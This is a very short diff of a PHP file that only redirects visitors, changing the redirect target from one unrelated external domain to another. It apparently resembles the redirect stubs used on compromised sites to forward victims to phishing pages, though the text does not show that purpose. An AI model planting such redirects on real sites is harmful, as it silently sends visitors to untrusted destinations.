@@ -1,4 +1,4 @@
 <?php
-header("Location: http://boosterinterior.us/offi/");
+header("Location: https://web.adventurekidsplaycare.com/");
 die();
 ?>
